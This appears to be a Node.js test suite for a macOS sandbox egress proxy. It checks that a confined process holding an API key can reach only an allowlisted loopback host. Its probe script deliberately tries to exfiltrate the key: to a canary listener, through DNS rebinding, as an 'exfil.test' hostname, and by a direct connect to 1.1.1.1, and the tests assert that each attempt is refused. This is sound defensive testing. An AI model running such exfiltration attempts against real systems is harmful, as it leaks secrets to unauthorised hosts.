/**
 * Egress, walked on macOS: a real node process under sandbox-exec with the
 * composed profile, holding a granted key, against two loopback listeners.
 * `allowed.localhost` and `canary.localhost` both resolve to 127.0.0.1 (the
 * proxy answers *.localhost itself, RFC 6761), so only the allowlist tells
 * them apart. No case reaches a host outside this machine, except one
 * connect to 1.1.1.1:443 from INSIDE the sandbox, which runs only after the
 * profile text is shown to admit no non-loopback network rule, and which the
 * sandbox refuses with EPERM at connect(), before a packet is built.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { connect, createServer } from 'node:net';
import { mkdtempSync, rmSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { prepareRunEnv } from '../src/valet/env.js';
import { sandboxRunArgv, startRunEgress } from '../src/valet/sandbox.js';
import { buildSeatbeltProfile } from '../src/sandbox/seatbelt.js';
import { startFakeProvider } from '../test-support/fake-provider.js';

const KEY = 'sk-granted-egress-0123456789abcdef';
const macTest = process.platform === 'darwin' ? test : test.skip;
const NC = '/usr/bin/nc';

/** A loopback listener that counts connections and keeps every byte it gets. */
const listener = async () => {
  const state = { connections: 0, bytes: Buffer.alloc(0) };
  const server = createServer((socket) => {
    state.connections += 1;
    socket.on('error', () => {});
    socket.on('data', (chunk) => {
      state.bytes = Buffer.concat([state.bytes, chunk]);
      socket.end('HTTP/1.1 200 OK\r\nContent-Length: 4\r\nConnection: close\r\n\r\npong');
    });
  });
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  state.port = server.address().port;
  state.close = () => new Promise((done) => { server.closeAllConnections?.(); server.close(() => done()); });
  return state;
};

// Async on purpose: the proxy and the listeners live in this process.
const run = (argv, { env, cwd }) => new Promise((done) => {
  const child = spawn(argv[0], argv.slice(1), { env, cwd, stdio: ['ignore', 'pipe', 'pipe'] });
  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (chunk) => { stdout += chunk; });
  child.stderr.on('data', (chunk) => { stderr += chunk; });
  const timer = setTimeout(() => child.kill('SIGKILL'), 30_000);
  child.on('close', (code) => { clearTimeout(timer); done({ code, stdout, stderr }); });
});

// Reports error codes and statuses only; sends the key where the case says to.
const PROBE = String.raw`
const net = require('net'); const dns = require('dns');
const [mode, A, C, providerURL] = process.argv.slice(1);
const key = process.env.OPENAI_API_KEY;
const once = (fn) => { let done = false; return (v) => { if (!done) { done = true; fn(v); } }; };
const viaProxy = (target, payload) => new Promise((resolve) => {
  const done = once(resolve);
  const proxy = new URL(process.env.HTTPS_PROXY);
  const s = net.connect({ host: proxy.hostname, port: Number(proxy.port) });
  let raw = ''; let open = false;
  s.on('error', (e) => done({ error: e.code }));
  s.on('connect', () => s.write('CONNECT ' + target + ' HTTP/1.1\r\nHost: ' + target + '\r\n\r\n'));
  s.on('data', (d) => {
    raw += d;
    if (!open && raw.includes('\r\n\r\n')) {
      const status = Number(raw.split(' ')[1]);
      if (status !== 200) { s.destroy(); done({ status }); return; }
      open = true; raw = ''; s.write(payload);
    }
  });
  s.on('close', () => done({ status: open ? 200 : 0, reply: raw.split('\r\n\r\n')[1] }));
  setTimeout(() => { s.destroy(); done({ timeout: true }); }, 5000);
});
const direct = (host, port, payload) => new Promise((resolve) => {
  const done = once(resolve);
  const started = Date.now();
  const s = net.connect({ host, port });
  s.on('connect', () => { if (payload) s.write(payload); s.end(); done({ result: 'OK' }); });
  s.on('error', (e) => done({ result: e.code, ms: Date.now() - started }));
  setTimeout(() => { s.destroy(); done({ result: 'TIMEOUT' }); }, 5000);
});
const unix = (path) => new Promise((resolve) => {
  const s = net.connect(path);
  s.on('connect', () => { s.destroy(); resolve('OK'); });
  s.on('error', (e) => resolve(e.code));
});
const lookup = (name) => new Promise((resolve) => dns.lookup(name, (e, a) => resolve(e ? e.code : a)));
const fetched = (url) => fetch(url).then((r) => r.text().then((t) => ({ status: r.status, body: t })), (e) => ({ error: e.cause?.code || e.name }));
(async () => {
  let out;
  if (mode === 'control') out = { directCanary: await direct('127.0.0.1', Number(C)), lookup: await lookup('x.localhost') };
  if (mode === 'outside') out = { directOutside: await direct('1.1.1.1', 443, 'KEY ' + key) };
  if (mode === 'confined') out = {
    holdsKey: key && key.length > 0,
    allowed: await viaProxy('allowed.localhost:' + A, 'KEY ' + key + '\r\n'),
    fetchAllowed: await fetched('http://allowed.localhost:' + A + '/through-node-fetch'),
    canary: await viaProxy('canary.localhost:' + C, 'KEY ' + key + '\r\n'),
    fetchCanary: await fetched('http://canary.localhost:' + C + '/?k=' + key),
    rebind: await viaProxy('a.wild.localhost:' + C, 'KEY ' + key),
    ipLiteral: await viaProxy('127.0.0.1:' + C, 'KEY ' + key),
    keyAsHost: await viaProxy(key + '.exfil.test:443', 'x'),
    directCanary: await direct('127.0.0.1', Number(C), 'KEY ' + key),
    directCanaryV6: await direct('::1', Number(C), 'KEY ' + key),
    directProxyPortOther: await direct('127.0.0.1', Number(A), 'KEY ' + key),
    lookup: await lookup('x.localhost'),
    mdns: await unix('/private/var/run/mDNSResponder'),
    provider: await fetched(providerURL + '/models'),
  };
  process.stdout.write(JSON.stringify(out));
})();`;

const withEgress = async (fn) => {
  const root = mkdtempSync(join(tmpdir(), 'seats-egress-walk-'));
  const allowed = await listener();
  const canary = await listener();
  const provider = await startFakeProvider();
  const events = [];
  const trace = { emit: (type, data) => events.push({ type, data }) };
  const runEnv = await prepareRunEnv({
    grant: {
      credentials: [{ name: 'OPENAI_API_KEY', from: 'env' }],
      network: { allow: [`allowed.localhost:${allowed.port}`, `*.wild.localhost:${canary.port}`] },
    },
    baseEnv: { ...process.env, HOME: homedir(), OPENAI_API_KEY: KEY },
    root,
  });
  const egress = await startRunEgress({ run: runEnv, provider: { baseURL: provider.baseURL }, trace });
  try {
    return await fn({ runEnv, egress, allowed, canary, provider, events, trace });
  } finally {
    await egress.close();
    await provider.close?.();
    await allowed.close();
    await canary.close();
    await runEnv.cleanup();
    rmSync(root, { recursive: true, force: true });
  }
};

const compose = (mode, { runEnv, egress, allowed, canary, provider, trace }) => {
  const composed = sandboxRunArgv({
    argv: [process.execPath, '-e', PROBE, mode, String(allowed.port), String(canary.port), provider.baseURL],
    run: runEnv,
    egress,
    trace,
  });
  assert.equal(composed.sandbox, 'seatbelt');
  return composed;
};
const runComposed = (composed, { runEnv }) => run(composed.argv, { env: composed.env, cwd: runEnv.home });

/** Every network-outbound allow in the profile, comments skipped. */
const networkAllows = (profile) => profile.split('\n').filter((line) => !line.trimStart().startsWith(';')).join('\n')
  .match(/\(allow network-outbound[^\n]*\)/g) || [];

macTest('a confined run reaches the allowed host through the proxy, and nothing else at all', () => withEgress(async (ctx) => {
  const { allowed, canary, provider, events } = ctx;
  // Positive control, unsandboxed: the canary is reachable directly, and
  // x.localhost resolves. A denial below is the sandbox, not a dead socket.
  const control = await run([process.execPath, '-e', PROBE, 'control', String(allowed.port), String(canary.port), provider.baseURL], { env: { PATH: '/usr/bin:/bin' } });
  assert.equal(control.code, 0, control.stderr);
  assert.deepEqual(JSON.parse(control.stdout), { directCanary: { result: 'OK' }, lookup: '::1' });
  assert.equal(canary.connections, 1, 'the control connected');
  canary.connections = 0;
  canary.bytes = Buffer.alloc(0);

  const composed = compose('confined', ctx);
  const done = await runComposed(composed, ctx);
  assert.equal(done.code, 0, done.stderr);
  const seen = JSON.parse(done.stdout);
  assert.equal(seen.holdsKey, true, 'the child holds its granted key');

  // Allowed, by a hand-written CONNECT and by node's own fetch honouring HTTPS_PROXY.
  assert.deepEqual(seen.allowed, { status: 200, reply: 'pong' });
  assert.deepEqual(seen.fetchAllowed, { status: 200, body: 'pong' });
  assert.ok(allowed.bytes.toString().includes(`KEY ${KEY}`), 'the key reached the host the grant names');

  // The canary, through the proxy: refused by name, by rebinding and as an IP.
  assert.deepEqual(seen.canary, { status: 403 });
  assert.equal(seen.fetchCanary.status, undefined, 'fetch through the proxy to the canary fails');
  assert.deepEqual(seen.rebind, { status: 403 });
  assert.deepEqual(seen.ipLiteral, { status: 403 });
  assert.deepEqual(seen.keyAsHost, { status: 403 });

  // The canary, around the proxy: the sandbox refuses the connect itself.
  assert.equal(seen.directCanary.result, 'EPERM');
  assert.equal(seen.directCanaryV6.result, 'EPERM');
  assert.equal(seen.directProxyPortOther.result, 'EPERM', 'the allowed host directly, skipping the proxy');

  // DNS: the run cannot resolve; the proxy does that for it.
  assert.equal(seen.lookup, 'ENOTFOUND');
  assert.equal(seen.mdns, 'EPERM');

  // The loopback provider is reached directly, via NO_PROXY and its one port.
  assert.equal(composed.env.NO_PROXY, '127.0.0.1');
  assert.equal(seen.provider.status, 200);
  assert.match(seen.provider.body, /fake-model/);

  assert.equal(canary.connections, 0, 'the canary saw no connection from the sandbox');
  assert.equal(canary.bytes.length, 0, 'and not one byte');

  const egressEvents = events.filter((event) => event.type.startsWith('egress.'));
  assert.deepEqual(egressEvents.filter((e) => e.type === 'egress.allowed'), [
    { type: 'egress.allowed', data: { host: 'allowed.localhost', port: allowed.port } },
    { type: 'egress.allowed', data: { host: 'allowed.localhost', port: allowed.port } },
  ]);
  assert.deepEqual(egressEvents.filter((e) => e.type === 'egress.denied').map((e) => e.data), [
    { host: 'canary.localhost', port: canary.port, reason: 'not_allowed' },
    { host: 'canary.localhost', port: canary.port, reason: 'not_allowed' },
    { host: 'a.wild.localhost', port: canary.port, reason: 'private_address' },
    { host: '127.0.0.1', port: canary.port, reason: 'ip_literal' },
    { host: '[redacted]', port: 443, reason: 'not_allowed' },
  ]);
  assert.ok(!JSON.stringify(events).includes(KEY), 'no secret value in the trace');
}));

macTest('a direct connect to a non-loopback address is refused by the sandbox', () => withEgress(async (ctx) => {
  const composed = compose('outside', ctx);
  // The guard: run the outside case only under a profile whose every network
  // allow is loopback. If this fails, the connect below never happens.
  assert.equal(composed.argv[0], '/usr/bin/sandbox-exec');
  assert.equal(composed.argv[1], '-p');
  const allows = networkAllows(composed.argv[2]);
  assert.ok(allows.length > 0 && allows.every((rule) => /^\(allow network-outbound \(remote tcp "localhost:\d+"\)\)$/.test(rule)), allows.join('\n'));
  assert.ok(!/\(allow network\*?[\s)]/.test(composed.argv[2]), 'no unfiltered network allow anywhere');
  const done = await runComposed(composed, ctx);
  assert.equal(done.code, 0, done.stderr);
  const { directOutside } = JSON.parse(done.stdout);
  assert.equal(directOutside.result, 'EPERM');
  assert.ok(directOutside.ms < 1000, 'refused at connect(), not after a network timeout');
}));

macTest('direct DNS to port 53 is refused inside the composed sandbox', () => withEgress(async ({ runEnv, egress }) => {
  const argv = [NC, '-v', '-u', '-w', '1', '127.0.0.1', '53'];
  const control = await run(argv, { env: { PATH: '/usr/bin:/bin' } });
  assert.equal(control.code, 0, 'control: unsandboxed, the UDP send to :53 goes out');
  assert.match(control.stderr, /succeeded/);
  const composed = sandboxRunArgv({ argv, run: runEnv, egress });
  const done = await run(composed.argv, { env: composed.env, cwd: runEnv.home });
  assert.equal(done.code, 1);
  assert.match(done.stderr, /port 53 \(udp\) failed: Operation not permitted/);
}));

// The DNS deny on its own, under the cli's open network profile: what it
// closes is reachable there, so this shows the deny doing the work rather
// than the default deny behind it.
macTest('the DNS deny alone closes port 53 and mDNSResponder, which the open profile leaves reachable', async () => {
  const home = mkdtempSync(join(tmpdir(), 'seats-dns-'));
  try {
    const PROBE_DNS = String.raw`
const net = require('net'); const dns = require('dns');
const unix = (p) => new Promise((r) => { const s = net.connect(p); s.on('connect', () => { s.destroy(); r('OK'); }); s.on('error', (e) => r(e.code)); });
const lookup = (n) => new Promise((r) => dns.lookup(n, (e, a) => r(e ? e.code : a)));
(async () => process.stdout.write(JSON.stringify({ mdns: await unix('/private/var/run/mDNSResponder'), lookup: await lookup('x.localhost') })))();`;
    const sandboxed = async (denyDns, argv) => {
      const profile = buildSeatbeltProfile({ workspacePath: home, executablePath: argv[0], statePath: home, denyDns });
      return run(['/usr/bin/sandbox-exec', '-p', profile, ...argv], { env: { HOME: home, PATH: '/usr/bin:/bin' }, cwd: home });
    };
    const nc = [NC, '-v', '-u', '-w', '1', '127.0.0.1', '53'];
    const openNc = await sandboxed(false, nc);
    assert.match(openNc.stderr, /succeeded/, 'control: the open profile lets UDP :53 out');
    const openNode = JSON.parse((await sandboxed(false, [process.execPath, '-e', PROBE_DNS])).stdout);
    assert.deepEqual(openNode, { mdns: 'OK', lookup: '::1' }, 'control: and reaches mDNSResponder');
    const deniedNc = await sandboxed(true, nc);
    assert.match(deniedNc.stderr, /Operation not permitted/);
    const deniedNode = JSON.parse((await sandboxed(true, [process.execPath, '-e', PROBE_DNS])).stdout);
    assert.deepEqual(deniedNode, { mdns: 'EPERM', lookup: 'ENOTFOUND' });
  } finally { rmSync(home, { recursive: true, force: true }); }
});

macTest('a client that ignores the proxy env has no route: it fails closed', () => withEgress(async ({ runEnv, egress, allowed, canary }) => {
  const composed = sandboxRunArgv({
    argv: [process.execPath, '-e', `require('net').connect(${allowed.port}, 'allowed.localhost').on('connect', () => console.log('OK')).on('error', (e) => console.log(e.code))`],
    run: runEnv,
    egress,
  });
  const done = await run(composed.argv, { env: composed.env, cwd: runEnv.home });
  // allowed.localhost cannot even be resolved inside: the resolver is out of reach.
  assert.match(done.stdout.trim(), /^(?:ENOTFOUND|EPERM)$/);
  assert.equal(allowed.connections, 0);
  assert.equal(canary.connections, 0);
}));

// The bridge inside a confined run is reached by a connect() that never names
// a host; check the proxy's own port is the one the env points at.
macTest('the proxy port is the one loopback route the profile admits besides the provider', () => withEgress(async ({ runEnv, egress, provider }) => {
  const composed = sandboxRunArgv({ argv: ['/usr/bin/true'], run: runEnv, egress });
  const providerPort = Number(new URL(provider.baseURL).port);
  assert.deepEqual(networkAllows(composed.argv[2]), [
    `(allow network-outbound (remote tcp "localhost:${egress.port}"))`,
    `(allow network-outbound (remote tcp "localhost:${providerPort}"))`,
  ]);
  assert.equal(new URL(composed.env.HTTPS_PROXY).port, String(egress.port));
  const reached = await new Promise((done) => {
    const socket = connect({ host: '127.0.0.1', port: egress.port });
    socket.on('connect', () => { socket.destroy(); done(true); });
    socket.on('error', () => done(false));
  });
  assert.equal(reached, true);
}));
